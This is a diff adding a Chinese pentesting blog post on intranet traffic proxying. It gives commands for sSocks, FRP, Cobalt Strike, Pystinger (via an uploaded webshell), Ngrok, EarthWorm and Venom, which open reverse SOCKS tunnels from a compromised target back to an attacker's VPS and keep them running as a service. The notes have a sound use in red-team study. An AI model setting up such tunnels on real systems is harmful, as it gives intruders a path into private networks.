@@ -1,0 +1,600 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Whatever is worth doing is worth doing well !">
+    <meta name="author" content="ssooking">
+    
+    <title>
+        
+            内网流量代理 |
+        
+        ssooking&#39;s notebook
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="shortcut icon" href="/images/logo.svg">
+    
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"ssooking.github.io","root":"/","language":"en","path":"search.json"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":false},"style":{"primary_color":"#0066CC","avatar":"/images/avatar.png","favicon":"/images/logo.svg","article_img_align":"left","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":false,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep moving!"},"scroll":{"progress_bar":{"enable":false},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":false},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"version":3};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                ssooking&#39;s notebook
+            </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                HOME
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                ARCHIVES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                CATEGORIES
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                TAGS
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/about"
+                            >
+                                ABOUT
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">CATEGORIES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">TAGS</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/about">ABOUT</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">内网流量代理</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/avatar.png">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">ssooking</span>
+                        
+                            <span class="author-label">Lv5</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-edit"></i>&nbsp;
+        <span class="pc">2020-05-18 11:18:00</span>
+        <span class="mobile">2020-05-18 11:18</span>
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/categories/%E6%94%BB%E9%98%B2%E6%B8%97%E9%80%8F/">攻防渗透</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/%E6%B5%81%E9%87%8F%E4%BB%A3%E7%90%86/">流量代理</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h1 id="sSocket"><a href="#sSocket" class="headerlink" title="sSocket"></a>sSocket</h1><p>下载地址：<a class="link"   target="_blank" rel="noopener" href="https://sourceforge.net/projects/ssocks/" >https://sourceforge.net/projects/ssocks/<i class="fas fa-external-link-alt"></i></a></p>
+<blockquote>
+<p>​    一个socks代理工具套装，可用来开启socks代理服务，支持socks5验证，支持IPV6和UDP，并提供反向socks代理服务。</p>
+</blockquote>
+<p>vps监听1088端口：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rcsocket.exe –l 1088 –p 8888 –vv</span><br></pre></td></tr></table></figure>
+
+<p>内网目标机器执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./rssocks –vv –s VPSip:8888</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="FRP"><a href="#FRP" class="headerlink" title="FRP"></a>FRP</h1><p>frp下载链接：<a class="link"   target="_blank" rel="noopener" href="https://github.com/fatedier/frp/releases" >https://github.com/fatedier/frp/releases<i class="fas fa-external-link-alt"></i></a></p>
+<p>frps上传到服务器上；frpc是要放到目标机上。</p>
+<p>1、配置服务端</p>
+<p>修改frps.ini服务器端配置文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 10800</span><br></pre></td></tr></table></figure>
+
+<p>2、配置客户端</p>
+<p>修改frpc.ini客户端配置文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 110.120.90.80</span><br><span class="line">server_port = 10800</span><br><span class="line"></span><br><span class="line">[socks5]</span><br><span class="line">type = tcp</span><br><span class="line">remote_port = 10800</span><br><span class="line">plugin = socks5</span><br><span class="line">use_encryption = true</span><br><span class="line">use_compression = true</span><br></pre></td></tr></table></figure>
+
+<p>3、启动</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">先启动服务端：./frps -c ./frps.ini</span><br><span class="line">再启动客户端：./frpc -c ./frpc.ini</span><br><span class="line"></span><br><span class="line"><span class="built_in">nohup</span> sudo ./frps -c frps.ini &gt; <span class="built_in">log</span> 2&gt;&amp;1 &amp;</span><br></pre></td></tr></table></figure>
+
+<p>4、设置代理工具，连接到vps公网ip的10800端口</p>
+<p>5、开机自启</p>
+<p>Linux环境下，frp只能通过systemd方式自启。</p>
+<p><code>frp_0.34.3_linux_amd64.tar.gz</code> 解压之后可以看到一个 <code>systemd</code> 目录，将其中的 <code>frps.service</code> 文件复制到服务器的 <code>/etc/systemd/system/</code> 目录下，并修改 <code>ExecStart=/usr/local/frp/frps -c /usr/local/frp/frps.ini</code>。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=frpc</span><br><span class="line">Wants=network-online.target</span><br><span class="line">After=network.target network-online.target</span><br><span class="line">Requires=network-online.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">ExecStart=/home/pi/github/frp_0.33.0_linux_arm/frpc -c /home/pi/github/frp_0.33.0_linux_arm/frpc.ini</span><br><span class="line"><span class="comment">#ExecStart=/home/pi/github/frp_0.33.0_linux_arm/run.sh</span></span><br><span class="line">ExecStop=/bin/kill <span class="variable">$MAINPID</span></span><br><span class="line">Restart=always</span><br><span class="line">RestartSec=5</span><br><span class="line">StartLimitInterval=0</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>
+
+<p>命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#重新加载配置文件</span></span><br><span class="line">sudo systemctl daemon-reload       <span class="comment">#service文件改动后要重新reload一下（类似刷新到缓存里）</span></span><br><span class="line">sudo systemctl <span class="built_in">enable</span> frp.service  <span class="comment">#设置开机启动</span></span><br><span class="line">sudo systemctl status frp.service  <span class="comment">#查询自启状态</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="CobaltStrike"><a href="#CobaltStrike" class="headerlink" title="CobaltStrike"></a>CobaltStrike</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">beacon &gt; socks 1024 <span class="comment">#端口根据VPS实际情况进行设置</span></span><br></pre></td></tr></table></figure>
+
+<p>Cs菜单栏<code>View &gt; Proxy Pivots</code>，复制代理连接到Metasploit中，或直接将socks4a挂在相关安全工具中。</p>
+<h1 id="Pystinger"><a href="#Pystinger" class="headerlink" title="Pystinger"></a>Pystinger</h1><p><a class="link"   target="_blank" rel="noopener" href="https://github.com/FunnyWolf/pystinger" >Pystinger<i class="fas fa-external-link-alt"></i></a></p>
+<blockquote>
+<p>毒刺(pystinger)通过webshell实现内网SOCK4代理, 端口映射.<br>可直接用于metasploit-framework, viper, cobalt strike上线.<br>主体使用python开发, 当前支持php, jsp(x), aspx三种代理脚本.</p>
+</blockquote>
+<ol>
+<li><p>上传代理脚本到目标服务器</p>
+</li>
+<li><p>在目标主机执行命令开启stinger_server服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Windows</span></span><br><span class="line">start stinger_server.exe</span><br><span class="line"></span><br><span class="line"><span class="comment"># Linux</span></span><br><span class="line"><span class="built_in">chmod</span> +x stinger_server &amp;&amp; ./stinger_server</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>在公网vps上执行命令打通隧道</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./stinger_client -w http://example.com:8080/proxy.jsp -l 127.0.0.1 -p 60000</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>此时已经在vps<code>127.0.0.1:60000</code>启动了一个<code>example.com</code>所在内网的<strong>socks4a</strong>代理</p>
+</li>
+<li><p>此时已经将目标服务器的<code>127.0.0.1:60020</code>映射到vps的<code>127.0.0.1:60020</code></p>
+</li>
+<li><p>用proxychains验证socks4a代理是否工作正常</p>
+</li>
+</ol>
+<h1 id="Sunny-Ngrok"><a href="#Sunny-Ngrok" class="headerlink" title="Sunny-Ngrok"></a>Sunny-Ngrok</h1><p>官网链接：<a class="link"   target="_blank" rel="noopener" href="http://ngrok.cc/" >http://ngrok.cc/<i class="fas fa-external-link-alt"></i></a></p>
+<p>支持HTTPS、TCP、UDP流量转发。使用方式参考<a class="link"   target="_blank" rel="noopener" href="https://www.ngrok.cc/_book/" >官方文档<i class="fas fa-external-link-alt"></i></a>。</p>
+<ol>
+<li>首先在Ngrok官网进行账号注册</li>
+<li>注册完进入系统，访问<code>开通隧道</code>，选择免费服务：</li>
+<li>进行隧道配置<ol>
+<li>隧道协议</li>
+<li>隧道名称：随意</li>
+<li>前置域名：随意，默认域名后缀为ngrok.cc</li>
+<li>本地端口</li>
+</ol>
+</li>
+<li>配置完毕并添加后，服务器自动分配了一个免费域名用于与目标站点进行映射</li>
+<li>在隧道管理中，点击”客户端下载”，并将客户端工具sunny.exe上传至目标服务器</li>
+<li>在目标服务器执行sunny，建立隧道连接：<code>sunny.exe clientid 隧道id</code></li>
+<li>此时在公网访问 Ngrok 服务器分配给我们的域名即可访问到服务器。</li>
+</ol>
+<p>类似的一个，不过仅支持HTTP(s)和WSS协议：<a class="link"   target="_blank" rel="noopener" href="https://natapp.cn/" >https://natapp.cn/<i class="fas fa-external-link-alt"></i></a></p>
+<h1 id="Earthworm"><a href="#Earthworm" class="headerlink" title="Earthworm"></a>Earthworm</h1><p>官网链接：<a class="link"   target="_blank" rel="noopener" href="http://rootkiter.com/EarthWorm/" >http://rootkiter.com/EarthWorm/<i class="fas fa-external-link-alt"></i></a></p>
+<p><strong>正向socks5代理</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s ssocksd -l 1080</span><br></pre></td></tr></table></figure>
+
+<p>直接代理工具直接设置为目标IP的1080端口即可</p>
+<p><strong>反向socks5代理</strong></p>
+<p>公网VPS添加隧道，把本地1080端口收到的代理请求转交给8888端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew_linux_x64 -s rcsocks -l 1080 -e 8888</span><br></pre></td></tr></table></figure>
+
+<p>目标主机开启反弹socks服务，连接公网机器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew_linux_x64 -s rssocks -d 公网VPS的IP -e 8888</span><br></pre></td></tr></table></figure>
+
+<p>现在通过公网VPS主机的8888端口可以直接访问内网</p>
+<p><strong>多级代理</strong></p>
+<p>参考官网文档。</p>
+<h1 id="venom"><a href="#venom" class="headerlink" title="venom"></a>venom</h1><p>官网链接：<a class="link"   target="_blank" rel="noopener" href="https://github.com/Dliv3/Venom" >https://github.com/Dliv3/Venom<i class="fas fa-external-link-alt"></i></a></p>
+<p>多级网络流量代理工具，可进行端口转发、端口复用、交互式shell等。</p>
+<h3 id="admin-x2F-agent命令行参数"><a href="#admin-x2F-agent命令行参数" class="headerlink" title="admin&#x2F;agent命令行参数"></a>admin&#x2F;agent命令行参数</h3><ul>
+<li><p><strong>admin节点和agent节点均可监听连接也可发起连接</strong></p>
+<p>admin监听端口，agent发起连接:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./admin_macos_x64 -lport 9999</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./agent_linux_x64 -rhost 192.168.0.103 -rport 9999</span><br></pre></td></tr></table></figure>
+
+<p>agent监听端口，admin发起连接:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./agent_linux_x64 -lport 8888</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./admin_macos_x64 -rhost 192.168.204.139 -rport 8888</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>节点间通信加密</strong></p>
+<p>Venom提供节点间通信加密功能，用户可通过<code>-passwd</code>选项指定密码，该密码用于生成AES加密所需的密钥。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 通过-passwd指定密码为dlive@dubhe</span></span><br><span class="line">./admin_macos_x64 -lport 8889 -passwd dlive@dubhe</span><br><span class="line"></span><br><span class="line"><span class="comment"># agent指定相同的密码与admin节点连接</span></span><br><span class="line">./agent_macos_x64 -rhost 192.168.0.103 -rport 8889 -passwd dlive@dubhe</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
+<li><p><a class="link"   target="_blank" rel="noopener" href="https://gofrp.org/docs/features/common/authentication/" >https://gofrp.org/docs/features/common/authentication/<i class="fas fa-external-link-alt"></i></a></p>
+</li>
+<li><p><a class="link"   target="_blank" rel="noopener" href="https://gitee.com/wefeng/frp" >https://gitee.com/wefeng/frp<i class="fas fa-external-link-alt"></i></a></p>
+</li>
+<li><p><a class="link"   target="_blank" rel="noopener" href="https://sanii.cn/article/306" >https://sanii.cn/article/306<i class="fas fa-external-link-alt"></i></a></p>
+</li>
+<li><p><a class="link"   target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzAwMjA5OTY5Ng==&mid=2247495112&idx=1&sn=ced8d92005c49440b0ca4af71bf9ff25&chksm=9acd3d57adbab4414575d1a0e5249a9db893f5bab008849bbf4d2abdef3a22d5766eb346c8db&mpshare=1&scene=1&srcid=0519VLC7FUNHDl4sd08VAfUW&sharer_sharetime=1621386406086&sharer_shareid=976d206c9e9dde0419bf9e41bec32824#rd" >实战中内网穿透的打法<i class="fas fa-external-link-alt"></i></a></p>
+</li>
+</ul>
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li>Post title：内网流量代理</li>
+        <li>Post author：ssooking</li>
+        <li>Create time：2020-05-18 11:18:00</li>
+        <li>
+            Post link：https://ssooking.github.io/2020/05/内网流量代理/
+        </li>
+        <li>
+            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/%E6%B5%81%E9%87%8F%E4%BB%A3%E7%90%86/">#流量代理</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                           rel="prev"
+                           href="/2020/05/python-https-server/"
+                        >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">python https server</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                           rel="next"
+                           href="/2020/05/nc%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"
+                        >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">nc端口转发</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            <footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+              <span>2016</span>
+              -
+            
+            2023&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">ssooking</a>
+        </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3</a>
+        </div>
+        
+        
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item page-aside-toggle">
+                <i class="fas fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-expand-width flex-center">
+            <i class="fas fa-arrows-alt-h"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="fas fa-arrow-up"></i>
+            </li>
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+    </ul>
+</div>
+
+    </div>
+
+    
+        <aside class="page-aside">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#sSocket"><span class="nav-number">1.</span> <span class="nav-text">sSocket</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#FRP"><span class="nav-number">2.</span> <span class="nav-text">FRP</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CobaltStrike"><span class="nav-number">3.</span> <span class="nav-text">CobaltStrike</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Pystinger"><span class="nav-number">4.</span> <span class="nav-text">Pystinger</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Sunny-Ngrok"><span class="nav-number">5.</span> <span class="nav-text">Sunny-Ngrok</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Earthworm"><span class="nav-number">6.</span> <span class="nav-text">Earthworm</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#venom"><span class="nav-number">7.</span> <span class="nav-text">venom</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#admin-x2F-agent%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%8F%82%E6%95%B0"><span class="nav-number">7.0.1.</span> <span class="nav-text">admin&#x2F;agent命令行参数</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%8F%82%E8%80%83"><span class="nav-number">8.</span> <span class="nav-text">参考</span></a></li></ol>
+    </div>
+</div>
+        </aside>
+    
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/dark-light-toggle.js"></script>
+
+
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+
+    
+<script src="/js/code-copy.js"></script>
+
+
+
+
+
+<div class="post-scripts">
+    
+        
+<script src="/js/left-side-toggle.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+<script src="/js/toc.js"></script>
+
+    
+</div>
+
+
+
+</body>
+</html>
